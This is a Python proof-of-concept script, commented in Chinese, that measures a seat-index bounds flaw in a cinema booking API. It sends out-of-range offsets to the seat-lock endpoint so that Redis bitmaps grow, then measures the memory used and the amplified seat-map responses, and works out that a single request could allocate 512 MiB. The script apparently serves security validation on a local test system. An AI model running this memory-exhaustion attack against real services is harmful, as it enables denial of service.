"""郑浩(Nova) 座位索引越界 → Redis 位图膨胀 → 座位图接口放大 的量化验证.

背景: /api/orders/lock 的 LockSeatsDTO 只有 @NotEmpty + @Size(max=4),
没有对 seatIndex 做 [0, seatCount) 范围校验, 越界索引会一路进到
lock_seat.lua 的 SETBIT, 而 Redis bitmap 的 SETBIT 会按 offset 立即分配内存
且永不回收。座位图 GET 侧 SessionBitmapReader.readWithPadding 在
bytes.length >= expected 时直接原样返回, 于是响应体被放大。

本脚本分档位量化 (offset 100k / 1M / 4M), 并打印 Redis 实际占用;
不在本机跑到 2^32-1 (那会分配 512MiB, 属于破坏性验证), 仅用 redis-cli
证明 Redis 的硬上界在哪。
"""
import argparse
import base64
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request

REDIS_CLI = r"C:\Program Files\Redis\redis-cli.exe"


def call(base, path, *, method="GET", token=None, body=None):
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    req = urllib.request.Request(base + path, data=data, headers=headers, method=method)
    t0 = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read()
            return resp.status, json.loads(raw), (time.perf_counter() - t0) * 1000, len(raw)
    except urllib.error.HTTPError as e:
        raw = e.read()
        return e.code, json.loads(raw), (time.perf_counter() - t0) * 1000, len(raw)


def rcli(*args):
    try:
        out = subprocess.run([REDIS_CLI, *args], capture_output=True, text=True, timeout=15)
        return (out.stdout or out.stderr).strip()
    except Exception as e:
        return f"<{e}>"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:8080")
    ap.add_argument("--user", default="user1")
    ap.add_argument("--offsets", default="100000,1000000,4000000")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    print("=" * 96)
    print("座位索引越界 → Redis 位图膨胀量化  " + time.strftime("%Y-%m-%d %H:%M:%S"))
    print("=" * 96)

    st, r, _, _ = call(base, "/api/auth/login", method="POST",
                       body={"username": args.user, "password": "123456"})
    token = r["data"]["token"]
    now = time.strftime("%Y-%m-%dT%H:%M:%S")

    # 收集若干未开场场次 (每个 offset 用一个独立场次, 避免相互干扰)
    sessions, seen = [], set()
    for off in (0, 1, 2, 3):
        d = time.strftime("%Y-%m-%d", time.localtime(time.time() + off * 86400))
        st, r, _, _ = call(base, f"/api/movies/113/sessions?date={d}")
        for s in (r.get("data") or []):
            if (s.get("startTime") or "") > now and s["id"] not in seen:
                seen.add(s["id"])
                sessions.append(s)
    print(f"可用未开场场次 {len(sessions)} 个\n")

    print(f"{'offset':>10} | {'session':>12} | {'SETBIT前 strlen':>16} | {'SETBIT后 strlen':>16} | "
          f"{'Redis memory':>13} | {'seat-map 响应字节':>17} | {'耗时ms':>8}")
    print("-" * 96)

    baseline_resp = None
    rows = []
    for i, off_s in enumerate(args.offsets.split(",")):
        off = int(off_s)
        if i >= len(sessions):
            print("  (场次不够, 跳过)")
            break
        sid = sessions[i]["id"]
        lock_key = f"cinema:session:{sid}:lock"
        before = rcli("strlen", lock_key)
        st, r, ms, nbytes = call(base, "/api/orders/lock", method="POST", token=token,
                                 body={"sessionId": sid, "seatIndexes": [off]})
        time.sleep(1.2)  # 让 @RateLimit 窗口滑过
        code = r.get("code")
        after = rcli("strlen", lock_key)
        mem = rcli("memory", "usage", lock_key)
        st2, r2, ms2, resp_bytes = call(base, f"/api/sessions/{sid}/seat-map", token=token)
        if baseline_resp is None and off > 0:
            baseline_resp = None
        print(f"{off:>10} | {sid:>12} | {before:>16} | {after:>16} | {mem:>13} | "
              f"{resp_bytes:>17} | {ms:>8.1f}   lock code={code}")
        rows.append((off, sid, before, after, mem, resp_bytes, ms, code))

    print("\n--- 对照: 未被污染的场次座位图 ---")
    clean = None
    for s in sessions[len(rows) + 1:]:
        st, r, ms, nbytes = call(base, f"/api/sessions/{s['id']}/seat-map", token=token)
        clean = (s["id"], nbytes, ms)
        print(f"  session={s['id']} 响应 {nbytes} 字节 ({ms:.1f}ms)  -- "
              f"正常场次 lock bitmap 应按 ceil(seatCount/8) 分配")
        break

    print("\n--- 外推 (seatCount=140 的正常位图 18 字节) ---")
    for off, sid, before, after, mem, resp_bytes, ms, code in rows:
        try:
            ratio = int(after) / 18
        except Exception:
            ratio = float("nan")
        print(f"  offset={off:>9}  位图 {after} 字节 = 正常值的 {ratio:9.1f}x  "
              f"seat-map 响应放大 {resp_bytes / 278:7.1f}x  (公共接口, 无需登录)")

    worst_bits = 2 ** 32 - 1
    print(f"\n  Redis SETBIT 硬上界 offset={worst_bits} (2^32-1):")
    print(f"    位图大小 = ceil({worst_bits}+1)/8 = {worst_bits // 8 + 1} 字节 ≈ "
          f"{(worst_bits // 8 + 1) / 1024 / 1024:.0f} MiB  (单个 key)")
    print(f"    seat-map base64 后 ≈ {(worst_bits // 8 + 1) * 4 / 3 / 1024 / 1024:.0f} MiB 每次请求")
    print("  单请求即可让 Redis 分配 512MiB, 且 bitmap 只增不减 → 反复调用可打满内存。")

    print("\n--- 验证 Redis 侧上界 (安全: 超上界会被立即拒绝, 不分配) ---")
    print("  redis-cli SETBIT __probe_bounds__ 4294967295 1 -> " +
          rcli("setbit", "__probe_bounds__", "4294967295", "1"))
    rcli("del", "__probe_bounds__")
    print("  redis-cli SETBIT __probe_bounds__ 4294967296 1 -> " +
          rcli("setbit", "__probe_bounds__", "4294967296", "1"))
    print("  redis-cli SETBIT __probe_bounds__ -1 1         -> " +
          rcli("setbit", "__probe_bounds__", "-1", "1"))
    rcli("del", "__probe_bounds__")

    print("\n" + "=" * 96)
    print("复现命令: python test/seat_index_bounds_probe.py")
    print("清理: redis-cli del cinema:session:<sid>:lock cinema:session:<sid>:sold")
    print("=" * 96)
    return 0


if __name__ == "__main__":
    import urllib.parse  # noqa: F401
    sys.exit(main())
